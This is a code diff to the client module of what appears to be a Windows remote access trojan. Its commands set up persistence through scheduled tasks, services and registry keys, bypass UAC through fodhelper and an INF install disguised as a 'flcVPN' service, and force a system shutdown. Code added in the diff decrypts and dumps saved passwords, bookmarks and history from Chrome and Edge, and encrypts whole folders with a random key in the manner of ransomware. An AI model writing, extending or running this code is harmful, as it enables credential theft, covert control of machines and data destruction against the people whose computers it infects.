@@ -1,14 +1,16 @@
 import contextlib
 import inspect
 import io
+import json
 import locale
 import os
 import subprocess
+import time
 from functools import wraps
 from pathlib import Path
 
 from client.util import *
-from common.util import parse_args, logger, parse
+from common.util import parse_args, logger, parse, get_time
 
 if os.name == 'nt':
     import winreg
@@ -61,9 +63,23 @@ def enclosing(func):
         arg_str = args[0]
         # 嵌套函数列表
         if not arg_str:
-            return 1, format_dict({k: v.help for k, v in nested_funcs.items() if hasattr(v, 'help')})
+            return 1, format_dict_with_index({k: v.help for k, v in nested_funcs.items() if hasattr(v, 'help')})
         # 拆分函数参数
         name, arg = parse(arg_str)
+
+        # 根据序号获取嵌套函数
+        nested_funcs = {k: v for k, v in nested_funcs.items() if callable(v)}
+        try:
+            index = int(name)
+            nested_func = list(nested_funcs.items())[index][1]
+            # 获取嵌套函数参数个数
+            if len(inspect.getfullargspec(nested_func).args):
+                return nested_func(arg)
+            else:
+                return nested_func()
+        except:
+            pass
+
         # 根据嵌套函数名获取嵌套函数
         if name in nested_funcs and callable(nested_funcs[name]):
             nested_func = nested_funcs[name]
@@ -145,7 +161,7 @@ class Command:
             return 1, ''
 
     @staticmethod
-    def noreturn(command):
+    def run(command):
         if not command:
             return 0, ''
         p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
@@ -238,9 +254,10 @@ class Command:
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.ZwShutdownSystem(2)
 
+    @staticmethod
     @desc('apply persistence mechanism')
     @enclosing
-    def persistence(args):
+    def persist(args):
         """ 添加开机启动项 """
 
         @desc('create registry key')
@@ -267,7 +284,7 @@ class Command:
             """ 计划任务 """
             if not option:
                 return Command.shell(
-                    f'schtasks.exe /create /tn rat /sc onlogon /ru system /rl highest /tr {EXECUTABLE_PATH} /f')
+                    f'schtasks.exe /create /tn rat /sc onlogon /ru system /rl highest /tr "{EXECUTABLE_PATH}" /f')
             elif option == '--undo':
                 return Command.shell('schtasks.exe /delete /tn rat /f')
             else:
@@ -278,7 +295,7 @@ class Command:
         def service(option):
             """ 服务 """
             if not option:
-                return Command.shell(f'sc create rat binpath={EXECUTABLE_PATH} start= auto')
+                return Command.shell(f'sc create rat binpath="{EXECUTABLE_PATH}" start= auto')
             elif option == '--undo':
                 return Command.shell('sc delete rat')
             else:
@@ -330,8 +347,7 @@ class Command:
     @staticmethod
     @desc('elevate as admin without uac prompt')
     @enclosing
-    def bypassuac(args):
-
+    def uac(args):
         @desc('trusted binary')
         @require_integrity('Medium')
         def fodhelper():
@@ -402,7 +418,7 @@ RunPreSetupCommands=RunPreSetupCommandsSection
 [Strings]
 ServiceName="flcVPN"
 ShortSvcName="flcVPN"
-'''.format(EXECUTABLE_PATH)
+            '''.format(EXECUTABLE_PATH)
             inf_path = os.path.join(tempfile.gettempdir(), 'tmp.inf')
             with open(inf_path, 'w') as f:
                 f.write(inf_template)
@@ -421,3 +437,76 @@ ShortSvcName="flcVPN"
             return 1, 'success'
 
         return locals()
+
+    @staticmethod
+    @desc('extract data from browser')
+    @params(['browser', 'data'])
+    def browser(this, args):
+        home = os.path.expanduser('~')
+        profile_paths = {
+            'chrome': os.path.join(home, r'AppData\Local\Google\Chrome\User Data'),
+            'edge': os.path.join(home, r'AppData\Local\Microsoft\Edge\User Data'),
+        }
+        profile_path = profile_paths.get(this.browser)
+        if not profile_path:
+            return 0, 'not supported: {}'.format(this.browser)
+        if not os.path.isdir(profile_path):
+            return 0, 'not installed: {}'.format(this.browser)
+        local_state = os.path.join(profile_path, 'Local State')
+        default = os.path.join(profile_path, r'Default')
+        login_data = os.path.join(default, 'Login Data')
+        bookmarks = os.path.join(default, 'Bookmarks')
+        history = os.path.join(default, 'History')
+        if this.data == 'password':
+            return 1, json.dumps(get_chromium_passwords(get_master_key(local_state), login_data),
+                                 sort_keys=False,
+                                 indent=2,
+                                 ensure_ascii=False)
+        elif this.data == 'bookmark':
+            return 1, json.dumps(get_chromium_bookmarks(bookmarks), indent=2, ensure_ascii=False)
+        elif this.data == 'history':
+            return 1, json.dumps(get_chromium_history(history), sort_keys=False, indent=2, ensure_ascii=False)
+        else:
+            return 0, 'unknown data: {}'.format(this.data)
+
+    @staticmethod
+    def encrypt(path):
+        import tempfile, base64
+        from Crypto.Random import get_random_bytes
+        key = get_random_bytes(32)
+        with open(os.path.join(tempfile.gettempdir(), 'key'), 'wb') as f:
+            f.write(base64.b64encode(key))
+        if os.path.isfile(path):
+            encrypt_file(path, key)
+            return 1, f'key: {base64.b64encode(key).decode()}'
+        elif os.path.isdir(path):
+            result = []
+            for root, subdirs, files in os.walk(path):
+                for filename in files:
+                    try:
+                        encrypt_file(os.path.join(root, filename), key)
+                    except Exception as e:
+                        result.append(str(e))
+            return 1, f'key: {base64.b64encode(key).decode()}\n{chr(10).join(result)}'
+        else:
+            return 0, 'No such file or directory'
+
+    @staticmethod
+    @params(['path', 'key'])
+    def decrypt(this, args):
+        import base64
+        key = base64.b64decode(this.key)
+        if os.path.isfile(this.path):
+            decrypt_file(this.path, key)
+            return 1, ''
+        elif os.path.isdir(this.path):
+            result = []
+            for root, subdirs, files in os.walk(this.path):
+                for filename in files:
+                    try:
+                        decrypt_file(os.path.join(root, filename), key)
+                    except Exception as e:
+                        result.append(str(e))
+            return 1, '\n'.join(result)
+        else:
+            return 0, 'No such file or directory'
